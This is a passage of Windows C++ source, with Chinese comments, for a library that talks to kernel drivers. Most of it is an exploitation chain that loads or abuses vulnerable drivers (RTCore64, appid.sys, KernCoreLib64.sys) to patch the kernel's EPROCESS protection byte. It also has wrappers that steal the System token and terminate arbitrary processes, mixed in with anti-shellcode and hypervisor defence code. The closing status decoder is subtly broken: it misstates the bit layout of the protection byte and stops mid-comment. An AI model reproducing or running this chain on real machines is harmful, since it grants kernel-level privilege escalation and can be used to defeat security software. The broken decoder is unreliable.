bool process_protect_kernel_set_ppl(unsigned long pid,
                                    unsigned char protection,
                                    unsigned char sigLevel) {
    if (!kernel_ioctl_ready() || pid == 0) return false;
    CustomSetPplReq req; memset(&req, 0, sizeof(req));
    req.pid = pid;
    req.protection = protection;
    req.sigLevel = sigLevel;
    DWORD ret = 0;
    if (!DeviceIoControl(g_pp.device, CUSTOM_SET_PPL,
                        &req, (DWORD)sizeof(req),
                        nullptr, 0, &ret, nullptr)) {
        log_msg("kernel_set_ppl: IOCTL failed err=%lu pid=%lu", GetLastError(), pid);
        return false;
    }
    log_msg("kernel_set_ppl: pid=%lu protection=0x%02x sigLevel=0x%02x OK", pid, protection, sigLevel);
    return true;
}

// 按 PID 查询 PPL 保护字节
unsigned char process_protect_kernel_query_ppl(unsigned long pid) {
    if (!kernel_ioctl_ready() || pid == 0) return 0xFF;
    CustomQueryPplReq req; memset(&req, 0, sizeof(req));
    req.pid = pid;
    CustomQueryPplRsp rsp; memset(&rsp, 0, sizeof(rsp));
    DWORD ret = 0;
    // 用足够大的缓冲区
    unsigned char buf[32]; memset(buf, 0, sizeof(buf));
    memcpy(buf, &req, sizeof(req));
    if (!DeviceIoControl(g_pp.device, CUSTOM_QUERY_PPL,
                        buf, (DWORD)sizeof(req),
                        buf, sizeof(buf), &ret, nullptr)) {
        log_msg("kernel_query_ppl: IOCTL failed err=%lu pid=%lu", GetLastError(), pid);
        return 0xFF;
    }
    if (ret < sizeof(rsp)) {
        log_msg("kernel_query_ppl: short reply ret=%lu", ret);
        return 0xFF;
    }
    memcpy(&rsp, buf, sizeof(rsp));
    log_msg("kernel_query_ppl: pid=%lu protection=0x%02x", pid, rsp.protection);
    return rsp.protection;
}

// 内核终止任意进程
bool process_protect_kernel_kill(unsigned long pid, int exitStatus) {
    if (!kernel_ioctl_ready() || pid == 0) return false;
    CustomKillReq req; memset(&req, 0, sizeof(req));
    req.pid = pid;
    req.exitStatus = exitStatus;
    DWORD ret = 0;
    if (!DeviceIoControl(g_pp.device, CUSTOM_KILL_PROCESS,
                        &req, (DWORD)sizeof(req),
                        nullptr, 0, &ret, nullptr)) {
        log_msg("kernel_kill: IOCTL failed err=%lu pid=%lu", GetLastError(), pid);
        return false;
    }
    log_msg("kernel_kill: pid=%lu exitStatus=0x%x OK", pid, exitStatus);
    return true;
}

// Token 窃取 (复制源进程 Token 到目标进程)
bool process_protect_kernel_steal_token(unsigned long targetPid,
                                        unsigned long sourcePid) {
    if (!kernel_ioctl_ready() || targetPid == 0) return false;
    CustomStealTokenReq req; memset(&req, 0, sizeof(req));
    req.targetPid = targetPid;
    req.sourcePid = sourcePid; // 0 → 驱动默认 System (PID=4)
    DWORD ret = 0;
    if (!DeviceIoControl(g_pp.device, CUSTOM_STEAL_TOKEN,
                        &req, (DWORD)sizeof(req),
                        nullptr, 0, &ret, nullptr)) {
        log_msg("kernel_steal_token: IOCTL failed err=%lu target=%lu source=%lu",
                GetLastError(), targetPid, sourcePid);
        return false;
    }
    log_msg("kernel_steal_token: target=%lu source=%lu OK",
            targetPid, sourcePid ? sourcePid : 4);
    return true;
}

// ═══════════════════════════════════════════════════════════════════════
// ─── 反 shellcode / ETW-TI / systrace / 进程保护 IOCTL 封装 ──────────────
// ═══════════════════════════════════════════════════════════════════════

// 设置 syscall 扫描监控 PID (SCAN_SYSCALLS 目标)
bool process_protect_kernel_set_monitor_pid(unsigned long pid) {
    if (!kernel_ioctl_ready() || pid == 0) return false;
    CustomSetMonitorReq req; memset(&req, 0, sizeof(req));
    req.pid = pid;
    DWORD ret = 0;
    if (!DeviceIoControl(g_pp.device, CUSTOM_SET_MONITOR_PID,
                        &req, (DWORD)sizeof(req),
                        nullptr, 0, &ret, nullptr)) {
        log_msg("kernel_set_monitor_pid: IOCTL failed err=%lu pid=%lu",
                GetLastError(), pid);
        return false;
    }
    log_msg("kernel_set_monitor_pid: pid=%lu OK", pid);
    return true;
}

// 扫描监控进程的直接/间接 syscall stub → 命中页中和
bool process_protect_kernel_scan_syscalls(unsigned long* outHits,
                                           unsigned long* outNxBlocked) {
    if (outHits) *outHits = 0;
    if (outNxBlocked) *outNxBlocked = 0;
    if (!kernel_ioctl_ready()) return false;
    CustomScanResult rsp; memset(&rsp, 0, sizeof(rsp));
    DWORD ret = 0;
    if (!DeviceIoControl(g_pp.device, CUSTOM_SCAN_SYSCALLS,
                        nullptr, 0,
                        &rsp, (DWORD)sizeof(rsp), &ret, nullptr)) {
        log_msg("kernel_scan_syscalls: IOCTL failed err=%lu", GetLastError());
        return false;
    }
    if (ret < sizeof(rsp)) {
        log_msg("kernel_scan_syscalls: short reply ret=%lu", ret);
        return false;
    }
    if (outHits) *outHits = rsp.hits;
    if (outNxBlocked) *outNxBlocked = rsp.nxBlocked;
    log_msg("kernel_scan_syscalls: hits=%lu nxBlocked=%lu",
            rsp.hits, rsp.nxBlocked);
    return true;
}

// 事件驱动进程保护 (ObRegisterCallbacks)
bool process_protect_kernel_protect_pid(unsigned long pid) {
    if (!kernel_ioctl_ready() || pid == 0) return false;
    CustomProtectPidReq req; memset(&req, 0, sizeof(req));
    req.pid = pid;
    DWORD ret = 0;
    if (!DeviceIoControl(g_pp.device, CUSTOM_PROTECT_PID,
                        &req, (DWORD)sizeof(req),
                        nullptr, 0, &ret, nullptr)) {
        log_msg("kernel_protect_pid: IOCTL failed err=%lu pid=%lu",
                GetLastError(), pid);
        return false;
    }
    log_msg("kernel_protect_pid: pid=%lu OK", pid);
    return true;
}

bool process_protect_kernel_unprotect_pid(void) {
    if (!kernel_ioctl_ready()) return false;
    DWORD ret = 0;
    if (!DeviceIoControl(g_pp.device, CUSTOM_UNPROTECT_PID,
                        nullptr, 0, nullptr, 0, &ret, nullptr)) {
        log_msg("kernel_unprotect_pid: IOCTL failed err=%lu", GetLastError());
        return false;
    }
    log_msg("kernel_unprotect_pid: OK");
    return true;
}

// 反 shellcode 防御武装 — 成功后自动启动告警轮询
bool process_protect_kernel_arm_sc_defense(unsigned long pid) {
    if (!kernel_ioctl_ready() || pid == 0) return false;
    CustomScDefenseReq req; memset(&req, 0, sizeof(req));
    req.pid = pid;
    DWORD ret = 0;
    if (!DeviceIoControl(g_pp.device, CUSTOM_ARM_SC_DEFENSE,
                        &req, (DWORD)sizeof(req),
                        nullptr, 0, &ret, nullptr)) {
        log_msg("kernel_arm_sc_defense: IOCTL failed err=%lu pid=%lu",
                GetLastError(), pid);
        return false;
    }
    log_msg("kernel_arm_sc_defense: pid=%lu OK (scan+notifies+ETW-TI best-effort)", pid);
    // 自动启动告警轮询线程 (compromised=1 → kill 0x5C)
    process_protect_start_alert_polling();
    return true;
}

// 反 shellcode 防御解除 — 自动停止告警轮询
bool process_protect_kernel_disarm_sc_defense(void) {
    if (!kernel_ioctl_ready()) return false;
    // 先停告警轮询
    process_protect_stop_alert_polling();
    DWORD ret = 0;
    if (!DeviceIoControl(g_pp.device, CUSTOM_DISARM_SC_DEFENSE,
                        nullptr, 0, nullptr, 0, &ret, nullptr)) {
        log_msg("kernel_disarm_sc_defense: IOCTL failed err=%lu", GetLastError());
        return false;
    }
    log_msg("kernel_disarm_sc_defense: OK");
    return true;
}

// 查询反 shellcode 累计统计
bool process_protect_kernel_query_sc_stats(unsigned long* scans,
                                            unsigned long* pagesNx,
                                            unsigned long* threadsSeen,
                                            unsigned long* imagesSeen,
                                            unsigned long* unsignedImgs,
                                            unsigned long* filelessPe,
                                            unsigned long* etwTiEnabled) {
    if (scans) *scans = 0;
    if (pagesNx) *pagesNx = 0;
    if (threadsSeen) *threadsSeen = 0;
    if (imagesSeen) *imagesSeen = 0;
    if (unsignedImgs) *unsignedImgs = 0;
    if (filelessPe) *filelessPe = 0;
    if (etwTiEnabled) *etwTiEnabled = 0;
    if (!kernel_ioctl_ready()) return false;
    CustomScResult rsp; memset(&rsp, 0, sizeof(rsp));
    DWORD ret = 0;
    if (!DeviceIoControl(g_pp.device, CUSTOM_QUERY_SC_STATS,
                        nullptr, 0,
                        &rsp, (DWORD)sizeof(rsp), &ret, nullptr)) {
        log_msg("kernel_query_sc_stats: IOCTL failed err=%lu", GetLastError());
        return false;
    }
    if (ret < sizeof(rsp)) {
        log_msg("kernel_query_sc_stats: short reply ret=%lu", ret);
        return false;
    }
    if (scans) *scans = rsp.scans;
    if (pagesNx) *pagesNx = rsp.pagesNx;
    if (threadsSeen) *threadsSeen = rsp.threadsSeen;
    if (imagesSeen) *imagesSeen = rsp.imagesSeen;
    if (unsignedImgs) *unsignedImgs = rsp.unsignedImgs;
    if (filelessPe) *filelessPe = rsp.filelessPe;
    if (etwTiEnabled) *etwTiEnabled = rsp.etwTiEnabled;
    log_msg("kernel_query_sc_stats: scans=%lu nx=%lu threads=%lu imgs=%lu "
            "unsigned=%lu fileless=%lu etwTi=%lu",
            rsp.scans, rsp.pagesNx, rsp.threadsSeen, rsp.imagesSeen,
            rsp.unsignedImgs, rsp.filelessPe, rsp.etwTiEnabled);
    return true;
}

// ETW Threat-Intelligence 主方案 — 强制 ThreatInt provider 发射
bool process_protect_kernel_arm_etw_ti(void) {
    if (!kernel_ioctl_ready()) return false;
    DWORD ret = 0;
    if (!DeviceIoControl(g_pp.device, CUSTOM_ARM_ETW_TI,
                        nullptr, 0, nullptr, 0, &ret, nullptr)) {
        log_msg("kernel_arm_etw_ti: IOCTL failed err=%lu", GetLastError());
        return false;
    }
    log_msg("kernel_arm_etw_ti: OK (ThreatInt provider force-enabled)");
    return true;
}

bool process_protect_kernel_disarm_etw_ti(void) {
    if (!kernel_ioctl_ready()) return false;
    DWORD ret = 0;
    if (!DeviceIoControl(g_pp.device, CUSTOM_DISARM_ETW_TI,
                        nullptr, 0, nullptr, 0, &ret, nullptr)) {
        log_msg("kernel_disarm_etw_ti: IOCTL failed err=%lu", GetLastError());
        return false;
    }
    log_msg("kernel_disarm_etw_ti: OK (count=0)");
    return true;
}

// 查询告警
bool process_protect_kernel_query_alert(unsigned long* compromised,
                                        unsigned long* childBlocked,
                                        unsigned long* lastShellcodeType,
                                        unsigned long* creatorThreadId,
                                        unsigned long long* lastShellcodeVa) {
    if (compromised) *compromised = 0;
    if (childBlocked) *childBlocked = 0;
    if (lastShellcodeType) *lastShellcodeType = 0;
    if (creatorThreadId) *creatorThreadId = 0;
    if (lastShellcodeVa) *lastShellcodeVa = 0;
    if (!kernel_ioctl_ready()) return false;
    CustomScAlert rsp; memset(&rsp, 0, sizeof(rsp));
    DWORD ret = 0;
    if (!DeviceIoControl(g_pp.device, CUSTOM_QUERY_ALERT,
                        nullptr, 0,
                        &rsp, (DWORD)sizeof(rsp), &ret, nullptr)) {
        log_msg("kernel_query_alert: IOCTL failed err=%lu", GetLastError());
        return false;
    }
    if (ret < sizeof(rsp)) {
        log_msg("kernel_query_alert: short reply ret=%lu", ret);
        return false;
    }
    if (compromised) *compromised = rsp.compromised;
    if (childBlocked) *childBlocked = rsp.childBlocked;
    if (lastShellcodeType) *lastShellcodeType = rsp.lastShellcodeType;
    if (creatorThreadId) *creatorThreadId = rsp.creatorThreadId;
    if (lastShellcodeVa) *lastShellcodeVa = rsp.lastShellcodeVa;
    return true;
}

// 系统调用追踪 (KiDynamicTraceMask gate)
bool process_protect_kernel_arm_systrace(void) {
    if (!kernel_ioctl_ready()) return false;
    DWORD ret = 0;
    if (!DeviceIoControl(g_pp.device, CUSTOM_ARM_SYSTRACE,
                        nullptr, 0, nullptr, 0, &ret, nullptr)) {
        log_msg("kernel_arm_systrace: IOCTL failed err=%lu", GetLastError());
        return false;
    }
    log_msg("kernel_arm_systrace: OK (trace gate on)");
    return true;
}

bool process_protect_kernel_disarm_systrace(void) {
    if (!kernel_ioctl_ready()) return false;
    DWORD ret = 0;
    if (!DeviceIoControl(g_pp.device, CUSTOM_DISARM_SYSTRACE,
                        nullptr, 0, nullptr, 0, &ret, nullptr)) {
        log_msg("kernel_disarm_systrace: IOCTL failed err=%lu", GetLastError());
        return false;
    }
    log_msg("kernel_disarm_systrace: OK (mask restored)");
    return true;
}

// Thin Hypervisor (VMX + EPT)
bool process_protect_arm_hypervisor(void) {
    if (!kernel_ioctl_ready()) return false;
    DWORD ret = 0;
    if (!DeviceIoControl(g_pp.device, CUSTOM_ARM_HYPERVISOR,
                        nullptr, 0, nullptr, 0, &ret, nullptr)) {
        log_msg("kernel_arm_hypervisor: IOCTL failed err=%lu", GetLastError());
        return false;
    }
    log_msg("kernel_arm_hypervisor: OK (VMXON + EPT)");
    return true;
}

void process_protect_disarm_hypervisor(void) {
    if (!kernel_ioctl_ready()) return;
    DWORD ret = 0;
    DeviceIoControl(g_pp.device, CUSTOM_DISARM_HYPERVISOR,
                   nullptr, 0, nullptr, 0, &ret, nullptr);
    log_msg("kernel_disarm_hypervisor: OK");
}

// ═══════════════════════════════════════════════════════════════════════
// ─── JIT 代码缓存写保护 (EPT-based: 区分 JIT 合法写 vs 恶意篡改) ──────────
//   JDK20 代码缓存永久 RWX (os_windows.cpp:3476), JVM 用直接指针写
//   (nativeInst_x86.hpp:86 set_int_at) 修改; 写者 RIP 必在 jvm.dll 内
//   restricted EPT 将 JIT 2MB 物理页设 R-X → 写触发 EPT violation
//   → handler 检查写者 RIP → 允许(JVM) / 阻止(非 JVM)
//   周期扫描层: XOR 校验和 + tzd_is_jit_code 内容校验捕获 Unsafe.putByte
// ═══════════════════════════════════════════════════════════════════════

// 注册 JIT 代码缓存 GVA 范围 + 附着进程走页表限制物理页 R-X
//   JDK20 有 3 个代码堆, 可多次调用注册各自范围
bool process_protect_register_jit_range(unsigned long pid,
                                        unsigned long long base,
                                        unsigned long long size) {
    if (!kernel_ioctl_ready()) return false;
    CustomJitRangeReq req; memset(&req, 0, sizeof(req));
    req.pid = pid;
    req.base = base;
    req.size = size;
    DWORD ret = 0;
    if (!DeviceIoControl(g_pp.device, CUSTOM_REGISTER_JIT_RANGE,
                        &req, sizeof(req), nullptr, 0, &ret, nullptr)) {
        log_msg("register_jit_range: IOCTL failed err=%lu", GetLastError());
        return false;
    }
    log_msg("register_jit_range: OK pid=%lu base=0x%llx size=0x%llx", pid, base, size);
    return true;
}

// 设置 JVM 原生写者范围 (jvm.dll/java.exe 代码段; 合法 JIT 补丁的写者 RIP 必在此内)
bool process_protect_set_jvm_writer(unsigned long long jvmBase,
                                    unsigned long long jvmSize) {
    if (!kernel_ioctl_ready()) return false;
    CustomJvmWriterReq req; memset(&req, 0, sizeof(req));
    req.jvmBase = jvmBase;
    req.jvmSize = jvmSize;
    DWORD ret = 0;
    if (!DeviceIoControl(g_pp.device, CUSTOM_SET_JVM_WRITER,
                        &req, sizeof(req), nullptr, 0, &ret, nullptr)) {
        log_msg("set_jvm_writer: IOCTL failed err=%lu", GetLastError());
        return false;
    }
    log_msg("set_jvm_writer: OK base=0x%llx size=0x%llx", jvmBase, jvmSize);
    return true;
}

// 查询 JIT 篡改告警 (用户层轮询 → jitTampered=1 则 TerminateProcess(0x5C))
bool process_protect_query_jit_alert(unsigned long* jitTampered,
                                     unsigned long* jitBlocks,
                                     unsigned long* jitAllows,
                                     unsigned long* jitRangeCount,
                                     unsigned long long* tamperRip,
                                     unsigned long long* tamperVa) {
    if (!kernel_ioctl_ready()) return false;
    CustomJitAlert rsp; memset(&rsp, 0, sizeof(rsp));
    DWORD ret = 0;
    if (!DeviceIoControl(g_pp.device, CUSTOM_QUERY_JIT_ALERT,
                        nullptr, 0, &rsp, sizeof(rsp), &ret, nullptr)) {
        log_msg("query_jit_alert: IOCTL failed err=%lu", GetLastError());
        return false;
    }
    if (jitTampered)   *jitTampered = rsp.jitTampered;
    if (jitBlocks)     *jitBlocks = rsp.jitBlocks;
    if (jitAllows)     *jitAllows = rsp.jitAllows;
    if (jitRangeCount) *jitRangeCount = rsp.jitRangeCount;
    if (tamperRip)     *tamperRip = rsp.tamperRip;
    if (tamperVa)      *tamperVa = rsp.tamperVa;
    return true;
}

// 清除所有 JIT 范围 + 恢复 restricted EPT 为 RWX
bool process_protect_clear_jit_ranges(void) {
    if (!kernel_ioctl_ready()) return false;
    DWORD ret = 0;
    if (!DeviceIoControl(g_pp.device, CUSTOM_CLEAR_JIT_RANGES,
                        nullptr, 0, nullptr, 0, &ret, nullptr)) {
        log_msg("clear_jit_ranges: IOCTL failed err=%lu", GetLastError());
        return false;
    }
    log_msg("clear_jit_ranges: OK");
    return true;
}

// ═══════════════════════════════════════════════════════════════════════
// ─── 告警轮询线程 (ETW-TI + SC defense 的用户态消费者) ─────────────────────
//   500ms 周期查询 QUERY_ALERT: compromised=1 → TerminateProcess(self, 0x5C)
//   armScDefense 成功后自动启动; disarmScDefense 自动停止; 也可独立调用。
// ═══════════════════════════════════════════════════════════════════════

static HANDLE g_alertThread = NULL;
static volatile LONG g_alertPolling = 0;

static DWORD WINAPI alert_poll_thread(LPVOID) {
    while (InterlockedExchangeAdd(&g_alertPolling, 0)) {
        unsigned long compromised = 0, childBlocked = 0, type = 0, tid = 0;
        unsigned long long va = 0;
        if (process_protect_kernel_query_alert(&compromised, &childBlocked,
                                                &type, &tid, &va)) {
            if (compromised) {
                log_msg("ALERT: COMPROMISED type=%lu va=0x%llx childBlocked=%lu "
                        "— TerminateProcess(0x5C)", type, va, childBlocked);
                fflush(stderr);
                TerminateProcess(GetCurrentProcess(), 0x5C);
                // 不应到达此处; TerminateProcess 不返回
            }
        }
        Sleep(500);
    }
    return 0;
}

bool process_protect_start_alert_polling(void) {
    if (g_alertThread) return true;  // 已在运行
    InterlockedExchange(&g_alertPolling, 1);
    g_alertThread = CreateThread(nullptr, 0, alert_poll_thread, nullptr, 0, nullptr);
    if (!g_alertThread) {
        InterlockedExchange(&g_alertPolling, 0);
        log_msg("start_alert_polling: CreateThread failed err=%lu", GetLastError());
        return false;
    }
    log_msg("start_alert_polling: thread started (500ms poll → kill 0x5C on compromised)");
    return true;
}

bool process_protect_stop_alert_polling(void) {
    if (!g_alertThread) return true;  // 未运行
    InterlockedExchange(&g_alertPolling, 0);
    WaitForSingleObject(g_alertThread, 2000);
    CloseHandle(g_alertThread);
    g_alertThread = NULL;
    log_msg("stop_alert_polling: thread stopped");
    return true;
}

// ═══════════════════════════════════════════════════════════════════════
// ─── Public API 实现 ──────────────────────────────────────────────────────
// ═══════════════════════════════════════════════════════════════════════

int process_protect_byovd(const char* driverPath, int driverType,
                          unsigned char targetPpl) {
    memset(&g_pp, 0, sizeof(g_pp));
    g_pp.device = INVALID_HANDLE_VALUE;
    g_pp.driver_type = driverType;

    resolve_ntdll_funcs();

    // 1. 启用 SeDebugPrivilege (需管理员)
    if (!enable_debug_privilege()) {
        log_msg("SeDebugPrivilege failed — must run as Administrator");
        return TZD_PP_ERR_NO_ADMIN;
    }

    // 2a. appid.sys 模式 — 无需 SCM (驱动已加载)
    if (driverType == TZD_DRIVER_APPID) {
        log_msg("=== appid.sys SrpDevice 利用模式 ===");
        log_msg("  设备: %s  IOCTL: 0x%X (SrpVerifyDll, 无 PreviousMode 检查)",
                APPID_SRP_DEVICE, APPID_VERIFY_IOCTL);
        // 直接打开设备 (不加载驱动)
        if (!driver_open_device()) {
            log_msg("appid: 无法打开 %s — appid.sys 服务可能未运行",
                    APPID_SRP_DEVICE);
            return TZD_PP_ERR_DRIVER_OPEN;
        }
        g_pp.driver_loaded = true; // 设备已开 (非 SCM)
        // 创建 section + 探测 IOCTL 获取内核映射
        if (!appid_create_section(0x10000)) { // 64KB
            log_msg("appid: section 创建失败 — 无法获得内核 R/W 原语");
            log_msg("  SrpVerifyDll 的 IOCTL 输入格式需动态分析确认");
            log_msg("  尝试用 WinDbg 在 SrpVerifyDll 入口下断点, 发 IOCTL 0x%X", APPID_VERIFY_IOCTL);
            CloseHandle(g_pp.device); g_pp.device = INVALID_HANDLE_VALUE;
            return TZD_PP_ERR_DRIVER_OPEN;
        }
        if (!appid_probe_ioctl()) {
            log_msg("appid: IOCTL 探测未获得内核映射基址");
            log_msg("  SrpVerifyDll 可能内部检查了 RequestorMode, 或输入格式不匹配");
            log_msg("  需用 WinDbg 动态分析确认 SrpVerifyDll 的输入结构和行为");
            CloseHandle(g_pp.device); g_pp.device = INVALID_HANDLE_VALUE;
            return TZD_PP_ERR_DRIVER_OPEN;
        }
        log_msg("appid: 内核映射基址 = 0x%llx", g_appid.kernel_mapping_base);
        // 成功获得内核 R/W — 继续标准 BYOVD 链
    }
    // 2b. KernCoreLib64.sys 物理内存映射模式 (PCI-BAR 感知, 只扫 RAM, 不走虚拟 R/W 链)
    //     逆向 (见 ida_out/kerncore_dump.txt): 驱动仅 4 个 IOCTL — MAP/UNMAP 物理内存 +
    //     读写 I/O 端口; 无内核虚拟 R/W。MAP 起点固定 ~0xFC000800 (4GB 下 MMIO 窗口),
    //     size 无校验 → 映射 [~4GB, RAM) 含 MMIO 空洞。读 MMIO 会让总线挂起且无 #PF。
    //     故: 用 I/O 端口枚举 PCI memory BAR → 得设备 MMIO 范围 → 只扫非 MMIO 的 RAM → 不会卡死。
    else if (driverType == TZD_DRIVER_KERNCORE) {
        memset(&g_kc, 0, sizeof(g_kc));
        g_kc_ram_count = 0;
        g_kc_mmio_count = 0;
        log_msg("=== KernCoreLib64.sys 物理内存映射模式 (PCI-BAR 感知) ===");
        log_msg("  设备: %s  MAP=0x%X UNMAP=0x%X RDPORT=0x%X WRPORT=0x%X",
                KERNCORE_DEVICE, IOCTL_MAP_PHYS_MEM, IOCTL_UNMAP_PHYS_MEM,
                IOCTL_READ_IO_PORT, IOCTL_WRITE_IO_PORT);
        if (!driverPath) {
            log_msg("kerncore: 未提供驱动路径 — 需 KernCoreLib64.sys 绝对路径");
            return TZD_PP_ERR_NO_DRIVER;
        }
        snprintf(g_pp.service_name, sizeof(g_pp.service_name), "tzd_kc_%lu",
                 (unsigned long)GetTickCount());
        if (!driver_load(driverPath, g_pp.service_name))
            return TZD_PP_ERR_DRIVER_LOAD;
        if (!driver_open_device()) {
            driver_unload_internal();
            return TZD_PP_ERR_DRIVER_OPEN;
        }

        // 1) 用 I/O 端口 (PCI 配置周期, 安全) 枚举所有 memory BAR → 设备 MMIO 范围
        //    (若调用者已用 set_ram_ranges 注入可信范围, 则跳过自动枚举, 直接使用)
        if (g_kc_ram_count <= 0) {
            kerncore_enumerate_pci_mmio();
            // 2) 由 MMIO 推算可安全扫描的 RAM 范围 = [4GB, RAM_top) 减 MMIO
            unsigned long long ram_top = 0;
            ULONGLONG ram_kb = 0;
            if (GetPhysicallyInstalledSystemMemory(&ram_kb) && ram_kb > 0)
                ram_top = ram_kb * 1024;
            kerncore_compute_ram_ranges(ram_top);
        }
        if (g_kc_ram_count <= 0) {
            log_msg("kerncore: 无可扫描 RAM 范围 (MMIO 推算失败) — 拒绝扫描, 不卡死");
            driver_unload_internal();
            return TZD_PP_ERR_NO_RAMMAP;
        }

        // 3) 单次映射 [0xFC000800, RAM) — 仅创建 PTE, 不读物理页 (安全)
        if (!kerncore_map_physical()) {
            driver_unload_internal();
            return TZD_PP_ERR_DRIVER_OPEN;
        }

        // 4) 只在 RAM 范围内扫描本进程 EPROCESS (只读 RAM → 绝不读 MMIO → 不会卡死)
        int fr = kerncore_find_eprocess_safe();
        if (fr != 1) {
            driver_unload_internal();
            return (fr == -2) ? TZD_PP_ERR_NO_RAMMAP : TZD_PP_ERR_NO_EPROC;
        }

        // 5) patch EPROCESS.Protection (通过映射直接写物理内存)
        if (!kerncore_patch_protection(targetPpl)) {
            driver_unload_internal();
            return TZD_PP_ERR_WRITE;
        }
        // 映射随设备句柄释放 (driver_unload_internal 关闭 g_pp.device); Protection 已写入 RAM, 持久
        driver_unload_internal();

        // 双重验证: NtQueryInformationProcess(ProcessProtectionInformation)
        int q = query_protection_via_nt();
        if (q >= 0 && (unsigned char)q != targetPpl) {
            log_msg("WARNING: 内核读回=0x%02x 但 NtQuery=0x%02x (不匹配)",
                    g_pp.current_protection, q);
            // 不致命 — 物理内存读回已确认
        }
        log_msg("=== PPL ENABLED (KernCoreLib64): 0x%02x ===", targetPpl);
        return TZD_PP_OK;
    }
    // 2c. CUSTOM (tzd_ppl_drv.sys) — 支持已加载 + 内核直通快速路径
    else if (driverType == TZD_DRIVER_CUSTOM) {
        log_msg("=== tzd_ppl_drv.sys CUSTOM 模式 (内核直通增强) ===");

        // 先尝试打开设备 — 驱动可能已加载 (上次运行残留 / 手动加载)
        // 成功则跳过 SCM, 避免重复 加载/卸载 导致的 BSOD
        g_pp.device = CreateFileA(CUSTOM_DEVICE, GENERIC_READ | GENERIC_WRITE,
                                  0, nullptr, OPEN_EXISTING, 0, nullptr);
        if (g_pp.device != INVALID_HANDLE_VALUE) {
            log_msg("tzd_ppl_drv 设备已打开 — 驱动已加载, 跳过 SCM (svc=nullptr)");
            g_pp.driver_loaded = true;  // 非 SCM 加载; unload 只关句柄不停服务
            // g_pp.svc 保持 nullptr → driver_unload_internal 不碰 SCM
        } else {
            // 设备未打开 → 需通过 SCM 加载驱动
            if (!driverPath) {
                log_msg("no driver path provided");
                return TZD_PP_ERR_NO_DRIVER;
            }
            snprintf(g_pp.service_name, sizeof(g_pp.service_name), "tzd_pp_%lu",
                     (unsigned long)GetTickCount());
            if (!driver_load(driverPath, g_pp.service_name))
                return TZD_PP_ERR_DRIVER_LOAD;
            if (!driver_open_device()) {
                driver_unload_internal();
                return TZD_PP_ERR_DRIVER_OPEN;
            }
        }

        // 快速路径: 内核直通 SET_PPL (PsLookupProcessByProcessId → 直接写 EPROCESS)
        //   无需用户态 ntoskrnl 导出链, 更简单更可靠
        unsigned long myPid = (unsigned long)GetCurrentProcessId();
        log_msg("尝试内核直通 SET_PPL (PID=%lu, Protection=0x%02x)", myPid, targetPpl);
        if (process_protect_kernel_set_ppl(myPid, targetPpl,
                                            TZD_SE_SIGNING_LEVEL_WINDOWS_TCB)) {
            // 验证: NtQueryInformationProcess
            int q = query_protection_via_nt();
            if (q >= 0 && (unsigned char)q != targetPpl) {
                log_msg("WARNING: kernel set=0x%02x but NtQuery=0x%02x (mismatch)",
                        targetPpl, q);
                // 不致命 — 内核写入已成功
            }
            g_pp.current_protection = targetPpl;
            log_msg("=== PPL ENABLED (kernel-direct): 0x%02x ===", targetPpl);
            // 不卸载驱动 — 保持设备句柄可用 (后续 kernel_* 操作仍可调用)
            return TZD_PP_OK;
        }
        log_msg("kernel-direct SET_PPL 失败, 回退到用户态 ntoskrnl 导出链");
        // 回退: 走标准 ntoskrnl 导出链 (find_ntoskrnl → extract offsets → walk → patch)
    }
    // 2d. 标准 BYOVD (RTCore64 / GENERIC) — SCM 加载 .sys 驱动
    else {
        if (driverType == TZD_DRIVER_NONE || !driverPath) {
            log_msg("no driver provided — can only query status (PPL NOT enabled)");
            return TZD_PP_ERR_NO_DRIVER;
        }
        snprintf(g_pp.service_name, sizeof(g_pp.service_name), "tzd_pp_%lu",
                 (unsigned long)GetTickCount());
        if (!driver_load(driverPath, g_pp.service_name))
            return TZD_PP_ERR_DRIVER_LOAD;

        if (!driver_open_device()) {
            driver_unload_internal();
            return TZD_PP_ERR_DRIVER_OPEN;
        }
    }

    // 4. 找 ntoskrnl 基址
    if (!find_ntoskrnl_base()) {
        driver_unload_internal();
        return TZD_PP_ERR_NO_NTKRNL;
    }

    // 5. 动态解析偏移
    if (!extract_protection_offset()) {
        driver_unload_internal();
        return TZD_PP_ERR_OFFSET;
    }
    if (!extract_unique_pid_offset()) {
        driver_unload_internal();
        return TZD_PP_ERR_OFFSET;
    }

    // 6. 找本进程 EPROCESS
    if (!find_our_eprocess()) {
        driver_unload_internal();
        return TZD_PP_ERR_NO_EPROC;
    }

    // 7. Patch Protection
    if (!patch_protection(targetPpl)) {
        driver_unload_internal();
        return TZD_PP_ERR_WRITE;
    }

    // 8. 双重验证: NtQueryInformationProcess
    int q = query_protection_via_nt();
    if (q >= 0 && (unsigned char)q != targetPpl) {
        log_msg("WARNING: kernel read-back=0x%02x but NtQuery=0x%02x (mismatch)",
                g_pp.current_protection, q);
        // 不算致命 — 内核读回已确认。可能 NtQuery 需要刷新。
    }

    log_msg("=== PPL ENABLED: 0x%02x (target) ===", targetPpl);
    // 不卸载驱动 — 保持保护有效。卸载驱动不影响已设置的 Protection 字段,
    // 但保留设备句柄可用于后续操作。
    return TZD_PP_OK;
}

int process_protect_get_protection_byte(void) {
    resolve_ntdll_funcs();
    // 优先用 NtQueryInformationProcess (不需要驱动)
    int q = query_protection_via_nt();
    if (q >= 0) return q;
    // 若驱动已加载, 用内核读回
    if (g_pp.our_eprocess && g_pp.protection_offset && g_pp.device != INVALID_HANDLE_VALUE) {
        unsigned char v = 0;
        if (kread1(g_pp.our_eprocess + g_pp.protection_offset, &v)) return v;
    }
    return -1;
}

const char* process_protect_get_status(void) {
    int cur = process_protect_get_protection_byte();
    unsigned char pv = (cur >= 0) ? (unsigned char)cur : 0xFF;
    const char* level = "Unknown";
    unsigned char type = pv & 7;
    unsigned char signer = (pv >> 6) & 3;
    if (cur < 0) level = "QueryFailed";
    else if (pv == 0) level = "None";
    else {
        const char* types[] = {"None", "ProtectedLight", "Protected", "P-None"};
        const char* signers[] = {"None","Authenticode","CodeGen","Antimalware",
                                 "Lsa","Windows","WinTcb","WinSystem"};
        // signer 是 2 位, 但实际值 0-7 — 需要从高2位取
        signer = (pv >> 6) & 3; // 只能 0-3? 不对, 是 2 位 = 0-3
        // 实际 PS_PROTECTION.Signer 是 2 位? 不, 是 3 位 (bits 6-7... 只有2位)
        // 等等: Type:3 + Audit:3 + Signer:2 = 8 位. Signer 在 bits 6-7 (2位, 0-3)
        // 但公开文档说 Signer 有 0-7 八个值 — 这与2位矛盾
        // 重新检查: 实际上 Signer 是 bits 6-7 (2位), 但公开枚举 0-7 是错误的?
